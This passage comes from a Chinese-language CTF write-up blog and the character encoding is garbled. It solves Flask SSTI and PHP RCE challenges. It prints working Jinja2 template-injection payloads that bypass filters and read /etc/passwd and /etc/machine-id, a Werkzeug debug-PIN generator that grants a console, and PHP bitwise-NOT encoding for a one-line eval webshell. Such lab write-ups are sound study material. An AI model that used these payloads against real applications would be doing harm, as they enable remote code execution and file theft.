class="hljs-keyword">else</span>\:<br>        text = <span class="hljs-string">&quot;&quot;</span><br>        form = NameForm(text)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, form=form, method=<span class="hljs-string">&quot;åŠ å¯†&quot;</span>, img=<span class="hljs-string">&quot;flask.png&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/decode&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>()\:<br>    <span class="hljs-keyword">if</span> request.values.get(<span class="hljs-string">&#x27;text&#x27;</span>)\:<br>        text = request.values.get(<span class="hljs-string">&quot;text&quot;</span>)<br>        text_decode = base64.b64decode(text.encode())<br>        tmp = <span class="hljs-string">&quot;ç»“æœ ï¼š &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(text_decode.decode())<br>        <span class="hljs-keyword">if</span> waf(tmp)\:<br>            flash(<span class="hljs-string">&quot;no no no !!&quot;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;decode&#x27;</span>))<br>        res = render_template_string(tmp)<br>        flash(res)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;decode&#x27;</span>))<br>    <span class="hljs-keyword">else</span>\:<br>        text = <span class="hljs-string">&quot;&quot;</span><br>        form = NameForm1(text)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, form=form, method=<span class="hljs-string">&quot;è§£å¯†&quot;</span>, img=<span class="hljs-string">&quot;flask1.png&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&lt;name&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">not_found</span>(<span class="hljs-params">name</span>)\:<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;404.html&quot;</span>, name=name)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>\:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">5000</span>, debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†<code>os</code>,<code>eval</code>,<code>popen</code>ã€‚ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡å°±è¡Œï¼š</p><p><code>&#123;&#123;config.__class__.__init__.__globals__['o'+'s'].listdir('/')&#125;&#125;</code></p><p><img src="/img/flaskapp1.png" alt="flaskapp1"></p><p><code>&#123;&#123;config.__class__.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt').read()&#125;&#125;</code></p><p>å…¶å®<code>.æ–¹æ³•</code>å®Œå…¨å¯ä»¥é€šè¿‡<code>[]</code>æ›¿æ¢ï¼Œæ‰€ä»¥<code>payload</code>ä¹Ÿèƒ½æ¢æˆï¼š</p><p><code> &#123;&#123;config['__class__']['__init__']['__glo'+'bals__']['__builtins__']['e'+'val']("__im"+"port__('o'+'s').po"+"pen('cat /this_is_the_fl'+'ag.txt').read()")&#125;&#125;</code></p><p>ç¬¬äºŒç§æ–¹æ³•å°±æ˜¯ç”¨ä»–æç¤ºçš„<code>PIN</code>å»è§£é¢˜(<code>https://xz.aliyun.com/t/8092</code>)ï¼š</p><p><code>Flask å¦‚æœåœ¨ç”Ÿäº§ç¯å¢ƒä¸­å¼€å¯ debug æ¨¡å¼ï¼Œå°±ä¼šäº§ç”Ÿä¸€ä¸ªäº¤äº’çš„ shell ,å¯ä»¥æ‰§è¡Œè‡ªå®šä¹‰çš„ python ä»£ç ã€‚åœ¨è¾ƒæ—§ç‰ˆæœ¬ä¸­æ˜¯ä¸ç”¨è¾“å…¥ PIN ç å°±å¯ä»¥æ‰§è¡Œä»£ç ï¼Œåœ¨æ–°ç‰ˆæœ¬ä¸­éœ€è¦è¾“å…¥ä¸€ä¸ª PIN ç ã€‚</code></p><p>å¦‚æœè¦æ„é€ <code>PIN</code>ç ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“ä¸‹é¢è¿™äº›ä¿¡æ¯ï¼š</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><br><span class="hljs-number">1</span>.usernameå¯ä»¥ä» <span class="hljs-regexp">/etc/</span>passwd ä¸­è¯»å–ã€‚<br><span class="hljs-number">2</span>.modname ä¸€èˆ¬é»˜è®¤flask.app<br><span class="hljs-number">3</span>.getattr(app, <span class="hljs-string">&#x27;__name__&#x27;</span>, getattr(app.__class__, <span class="hljs-string">&#x27;__name__&#x27;</span>))ä¸€èˆ¬é»˜è®¤ä¸º Flask<br><span class="hljs-number">4</span>.flaskä¸‹app.pyçš„ç»å¯¹è·¯å¾„ã€‚é€šè¿‡æŠ¥é”™ä¿¡æ¯å¾—åˆ°ã€‚<br><span class="hljs-number">5</span>.str(uuid.getnode()) MACåœ°å€ è¯»å–è¿™ä¸¤ä¸ªåœ°å€ï¼š<span class="hljs-regexp">/sys/</span><span class="hljs-keyword">class</span><span class="hljs-regexp">/net/</span>eth0<span class="hljs-regexp">/address æˆ–è€… /</span>sys<span class="hljs-regexp">/class/</span>net<span class="hljs-regexp">/ens33/</span>address<br><span class="hljs-number">6</span>.æœ€åä¸€ä¸ªå°±æ˜¯æœºå™¨çš„idã€‚ å¯¹äºédockeræœºæ¯ä¸€ä¸ªæœºå™¨éƒ½ä¼šæœ‰è‡ªå·²å”¯ä¸€çš„idï¼Œlinuxçš„idä¸€èˆ¬å­˜æ”¾åœ¨<span class="hljs-regexp">/etc/m</span>achine-idæˆ–<span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>random/boot_iï¼Œæœ‰çš„ç³»ç»Ÿæ²¡æœ‰è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œwindowsçš„idè·å–è·Ÿlinuxä¹Ÿä¸åŒã€‚<br>å¯¹äºdockeræœºåˆ™è¯»å–<span class="hljs-regexp">/proc/</span>self/cgroup<br><br><br>#å‚è€ƒï¼šhttps:<span class="hljs-comment">//xz.aliyun.com/t/8092#toc-2</span><br><br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs gradle">#å› ä¸ºæˆ‘ä»¬çŸ¥é“è¦è¯»çš„æ–‡ä»¶æ˜¯ä»€ä¹ˆï¼Œç›´æ¥ç”¨openå°±è¡Œ<br><span class="hljs-number">1</span>.<br>&#123;% <span class="hljs-keyword">for</span> x in ().__class__.__base__.__subclasses__() %&#125;<br>&#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;warning&quot;</span> in x.__name__ %&#125;<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).<span class="hljs-keyword">read</span>() &#125;&#125;<br>&#123;%endif%&#125;<br>&#123;%endfor%&#125;<br>#æœ‰å¾ˆå¤šï¼Œä¸€èˆ¬è¦ä¹ˆæ˜¯rootè¦ä¹ˆæ˜¯æœ€åº•ä¸‹çš„flaskwebï¼Œè¯•ä¸€ä¸‹å°±è¡Œ<br><span class="hljs-number">2</span>.flask.app<br><span class="hljs-number">3</span>.Flask<br><span class="hljs-number">4</span>.<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>python3.<span class="hljs-number">7</span><span class="hljs-regexp">/site-packages/</span>flask/app.py<br><span class="hljs-number">5</span>. <span class="hljs-number">3</span>a:<span class="hljs-number">0</span>d:<span class="hljs-number">25</span>:ad:<span class="hljs-number">23</span>:<span class="hljs-number">12</span> #è¯»<span class="hljs-regexp">/sys/</span><span class="hljs-keyword">class</span><span class="hljs-regexp">/net/</span>eth0/addresså°±è¡Œï¼Œç„¶å<span class="hljs-keyword">int</span>(<span class="hljs-string">&quot;3a0d25ad2312&quot;</span>,<span class="hljs-number">16</span>)è½¬æ¢æˆ<span class="hljs-number">10</span>è¿›åˆ¶ï¼š<span class="hljs-number">63828141089554</span><br><span class="hljs-number">6</span>.<br>&#123;% <span class="hljs-keyword">for</span> x in ().__class__.__base__.__subclasses__() %&#125;<br>&#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;warning&quot;</span> in x.__name__ %&#125;<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;/etc/machine-id&#x27;</span>).<span class="hljs-keyword">read</span>() &#125;&#125;<br>&#123;%endif%&#125;<br>&#123;%endfor%&#125;<br># <span class="hljs-number">1408</span>f836b0ca514d796cbf8960e45fa1<br>è¿™é‡Œæˆ‘ç›´æ¥è¯»äº†<span class="hljs-regexp">/etc/m</span>achine-id<br><br>ç½‘ä¸Šçœ‹å…¶å®ƒå¸ˆå‚…å»è¯»çš„<span class="hljs-regexp">/proc/</span>self/cgroup(ç„¶åæ‰¾dockeråçš„å­—ç¬¦ä¸²,è¿™ä¸¤ä¸ªçœ‹ç€å¹¶ä¸ä¸€æ ·)<br>#d533bb8a3f0cd200ddb525a2ef04de18328f8cf780d71db3867a389664e27712<br><br></code></pre></td></tr></table></figure><p>åˆ©ç”¨æ–‡ç« ä¸­çš„æ–¹æ³•ç”Ÿæˆ<code>pin</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;flaskweb&#x27;</span><span class="hljs-comment"># username</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment"># modname</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="hljs-comment"># getattr(mod, &#x27;__file__&#x27;, None),</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;179143515503864&#x27;</span>,<span class="hljs-comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span><br>    <span class="hljs-string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span><span class="hljs-comment"># get_machine_id(), /etc/machine-id</span><br>]<br><br>h = hashlib.md5()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv =<span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br><br><span class="hljs-comment">#938-308-727</span><br></code></pre></td></tr></table></figure><p>åœ¨æŠ¥é”™ç•Œé¢ç‚¹å³ä¾§é‚£ä¸ªå°é»‘æ–¹æ¡†ï¼Œè¾“å…¥å¾—åˆ°çš„<code>PIN</code>å°±èƒ½è¿›å…¥äº¤äº’å¼ç»ˆç«¯äº†ï¼š</p><p><img src="/img/flaskapp7.png" alt="flaskapp7"></p><p>æ‹¿åˆ°<code>flag</code></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml"># å…¶å®ƒpayloadï¼Œå‚è€ƒäº†https://blog.csdn.net/rfrder/article/details/110240245</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__bases__</span>[0].__subclasses__()[75].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](<span class="hljs-name">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>).listdir(<span class="hljs-name">&#x27;/&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">c.__init__.__globals__</span>[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;txt.galf_eht_si_siht/&#x27;</span>[::-1],<span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="language-xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p><img src="/img/flasklight1.png" alt="flasklight1"></p><p>ä¼°è®¡<code>SSTI</code>ï¼Œæºç ä¸­æœ‰å¦‚ä¸‹æç¤ºï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- Parameter Name: search --&gt;</span><br><span class="hljs-comment">&lt;!-- Method: GET --&gt;</span><br></code></pre></td></tr></table></figure><p><code>/?search=&#123;&#123;7*7&#125;&#125;</code>å›æ˜¾<code>49</code>ï¼Œå­˜åœ¨<code>SSTI</code></p><p><code>?search=&#123;&#123;''.__class__.__base__.__base__.__subclasses__()&#125;&#125;</code>:</p><p><img src="/img/flasklight2.png" alt="flasklight2"></p><p>å¯ä»¥çœ‹åˆ°ç›®å‰æˆ‘ä»¬æ²¡ç¢°åˆ°ä»»ä½•è¿‡æ»¤ï¼Œæœ‰å¾ˆå¤šæ–¹æ³•å»æ‰§è¡Œå‘½ä»¤ï¼š</p><p><code>payload1</code>:(éœ€è¦è„šæœ¬å»æ‰¾å¯ä»¥è°ƒç”¨<code>os</code>æ¨¡å—çš„ç±»)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    url = <span class="hljs-string">&quot;http://9311a17d-d080-40a8-a7f2-83bda4f35d3f.node4.buuoj.cn:81/?search=%7B%7B&#x27;&#x27;.__class__.__base__.__base__.__subclasses__()[&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;]%7D%7D&quot;</span>  <span class="hljs-comment"># æ³¨æ„è¿™é‡Œä¸èƒ½ç›´æ¥åŠ i</span><br><br>    s = requests.get(url=url)<br>    time.sleep(<span class="hljs-number">0.06</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Print&#x27;</span> <span class="hljs-keyword">in</span> s.text:<br>        <span class="hljs-built_in">print</span>(i)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-comment">#æ³¨æ„urlé‚£é‡Œä¸€å®šè¦åŒå¼•å·åŒ…è£¹ã€‚ã€‚</span><br><br><span class="hljs-comment"># 71</span><br></code></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨<code>&#123;&#123;"".__class__.__base__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()&#125;&#125;</code>å»è®¿é—®è¿™ä¸ªæ¨¡å—å¹¶æ‰§è¡Œå‡½æ•°ï¼š</p><p><img src="/img/flasklight3.png" alt="flasklight3"></p><p>å‡ºç°äº†<code>500</code>ï¼Œ<code>__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()</code>è¿™éƒ¨åˆ†åº”è¯¥è§¦å‘äº†è¿‡æ»¤ï¼Œæˆ‘ä»¬æŒ‰é¡ºåºè¯•è¯•å…³é”®å­—å‘ç°<code>globals</code>è¢«è¿‡æ»¤äº†ï¼Œä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ï¼š</p><p><code>&#123;&#123;"".__class__.__base__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()&#125;&#125;</code></p><p><img src="/img/flasklight4.png" alt="flasklight4"></p><p>ç„¶åæ”¹å˜å‘½ä»¤å»æ‰¾æ–‡ä»¶å°±è¡Œ</p><p><code>flag&#123;7395b568-25c5-47b8-914a-7338fc453ec2&#125;</code></p><p><code>payload2</code>:</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__ == <span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> b <span class="hljs-keyword">in</span> c.__init__[<span class="hljs-string">&#x27;__glo&#x27;</span>+<span class="hljs-string">&#x27;bals__&#x27;</span>].values() <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> b.__class__ == &#123;&#125;.__class__ <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> <span class="hljs-string">&#x27;eval&#x27;</span> <span class="hljs-keyword">in</span> b.keys() <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; b[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flasklight/coomme_geeeett_youur_flek&quot;).read()&#x27;</span>) &#125;&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><p>æœ€åçœ‹ä¸‹<code>popen</code>å’Œ<code>open</code>çš„åŒºåˆ«ï¼š</p><p><img src="/img/flasklight6.png" alt="flasklight6"></p><p>å¦‚æœæˆ‘ä»¬è¦å»è¯»æŸä¸ªå·²çŸ¥çš„æ–‡ä»¶ï¼Œå¯ä»¥é€‰æ‹©ç”¨<code>open</code>ï¼Œå®ƒä¸è¦æ±‚æˆ‘ä»¬å»å¯»æ‰¾æŸä¸ªè°ƒç”¨<code>os</code>æ¨¡å—çš„ç±»ï¼Œä½†å¦‚æœæˆ‘ä»¬æƒ³æ‰§è¡Œå‘½ä»¤ï¼Œè¿˜æ˜¯è¦ç”¨<code>popen</code>ã€‚</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">40</span>)&#123;<br>                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;This is too Long.&quot;</span>);<br>                                                &#125;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);<br>                                                &#125;<br>                    @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-comment">// ?&gt;</span><br></code></pre></td></tr></table></figure><p>ä»£ç å¾ˆå¥½ç†è§£ï¼Œä¸è¿‡å®ƒä¸å…‰é™åˆ¶äº†<code>code</code>çš„é•¿åº¦ï¼Œè€Œä¸”æ­£åˆ™åŒ¹é…äº†æ‰€æœ‰å¤§å°å†™å­—æ¯åŠ æ•°å­—ï¼Ÿè¦æ€ä¹ˆæ„å»º<code>payload</code>ï¼Ÿ</p><p>ç½‘ä¸ŠæŸ¥äº†ä¸€ä¸‹<code>RCEè¿‡æ»¤å­—æ¯å’Œæ•°å­—</code>ï¼š<code>https://xz.aliyun.com/t/11929</code></p><p>ä¸»è¦æœ‰å¼‚æˆ–ã€è‡ªå¢ã€å–åä¸‰ç§æ–¹æ³•ã€‚å–åå¥½ç†è§£è€Œä¸”æ¯”è¾ƒçŸ­ï¼Œå°è¯•ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ans1</span>=<span class="hljs-string">&#x27;system&#x27;</span>;<span class="hljs-comment">//å‡½æ•°å</span><br><span class="hljs-variable">$ans2</span>=<span class="hljs-string">&#x27;ls&#x27;</span>;<span class="hljs-comment">//å‘½ä»¤</span><br><span class="hljs-variable">$data1</span>=(<span class="hljs-string">&#x27;~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$ans1</span>));<span class="hljs-comment">//é€šè¿‡ä¸¤æ¬¡å–åè¿ç®—å¾—åˆ°system</span><br><span class="hljs-variable">$data2</span>=(<span class="hljs-string">&#x27;~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$ans2</span>));<span class="hljs-comment">//é€šè¿‡ä¸¤æ¬¡å–åè¿ç®—å¾—åˆ°dir</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;(&#x27;</span>.<span class="hljs-variable">$data1</span>.<span class="hljs-string">&#x27;)&#x27;</span>.<span class="hljs-string">&#x27;(&#x27;</span>.<span class="hljs-variable">$data2</span>.<span class="hljs-string">&#x27;)&#x27;</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>ç»“æœä¼ ç»™<code>code</code>æ²¡æœ‰ä»»ä½•å›æ˜¾ï¼Œä¼°è®¡è§¦å‘äº†ä»€ä¹ˆå…³é”®å­—ï¼Œå°è¯•ç”¨ä¸€å¥è¯æœ¨é©¬è¿æ¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&quot;assert&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;eval($_REQUEST[1]);&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><span 